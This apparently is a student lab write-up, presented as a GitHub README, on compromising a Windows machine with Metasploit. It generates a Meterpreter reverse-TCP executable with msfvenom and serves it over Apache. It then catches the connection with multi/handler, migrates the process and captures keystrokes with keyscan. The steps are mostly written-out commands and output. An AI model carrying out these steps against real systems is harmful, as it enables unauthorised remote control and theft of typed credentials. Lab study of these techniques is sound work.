# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:


<img width="906" height="524" alt="image" src="https://github.com/user-attachments/assets/37bd34e9-d78a-48af-8e21-88ba03a7ccf7" />

Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```

### Output:
<img width="903" height="353" alt="image" src="https://github.com/user-attachments/assets/37e861b9-2f60-4705-858b-a34415c0978e" />



copy the fun.exe into the apache ```/var/www/html ```folder



Start apache server ```sudo systemctl apache2 start``` 



Check the status of apache2 ```sudo apache2 status```



<img width="563" height="708" alt="image" src="https://github.com/user-attachments/assets/fc28846a-940d-482e-afda-cb1fc2987805" />

Invoke msfconsole:


<img width="588" height="482" alt="image" src="https://github.com/user-attachments/assets/6e0d9018-cf50-4370-b561-74c9b40d18ae" />

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

### Output 
<img width="719" height="112" alt="image" src="https://github.com/user-attachments/assets/dbfbd573-6bd3-43b3-bec6-b232a7ca989b" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.



Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit

<img width="495" height="72" alt="image" src="https://github.com/user-attachments/assets/a70aa14c-ad12-45d4-a01e-4dcd78d309f0" />



To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.



keyscan_dump Shows the keystrokes captured so far

<img width="649" height="400" alt="image" src="https://github.com/user-attachments/assets/37ca6a30-076f-4f2e-8fc0-1651f56cb08f" />



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
